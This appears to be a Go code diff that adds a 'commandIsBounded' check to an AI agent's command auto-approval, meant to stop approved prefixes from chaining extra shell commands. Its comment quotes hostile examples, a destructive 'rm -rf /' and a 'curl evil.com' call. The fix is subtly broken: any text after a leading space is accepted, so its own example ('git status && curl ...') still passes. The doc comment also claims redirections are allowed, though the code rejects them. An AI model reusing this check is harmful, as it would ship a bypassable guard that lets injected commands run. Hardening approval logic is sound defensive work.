@@ -187,11 +187,35 @@ func (a *AutoModeState) semanticMatch(cmd string) (matched, allowed bool) {
 		if p == "" {
 			continue
 		}
-		if strings.HasPrefix(cmd, p) || strings.HasPrefix(prefix, p) {
+		// A prefix match only auto-allows when the command is "bounded":
+		// the approved prefix must be followed by nothing, whitespace (more
+		// args of the same command), or end-of-input — never by a shell
+		// metacharacter. Otherwise approving "git status" would also approve
+		// "git status; rm -rf /" or "git status && curl evil.com ...".
+		if (strings.HasPrefix(cmd, p) || strings.HasPrefix(prefix, p)) && commandIsBounded(cmd, p) {
 			return true, true
 		}
 	}
 	return false, false
+}
+
+// commandIsBounded reports whether cmd, having matched approved prefix p, does
+// not continue with a shell metacharacter that would start a new command. It
+// permits the remainder to be empty, whitespace-led (further arguments), or a
+// redirection that is part of the same simple command; it rejects ; && || | $
+// ( and backtick, which all introduce a separate command.
+func commandIsBounded(cmd, prefix string) bool {
+	rest := strings.TrimPrefix(cmd, prefix)
+	if rest == "" {
+		return true
+	}
+	next := rest[0]
+	// Whitespace continues the same command with more arguments.
+	if next == ' ' || next == '\t' {
+		return true
+	}
+	// Anything else (;, &, |, $, `(, newline, etc.) starts a new command.
+	return false
 }
 
 // hasBroadAllow reports whether there's a wildcard allow pattern for the
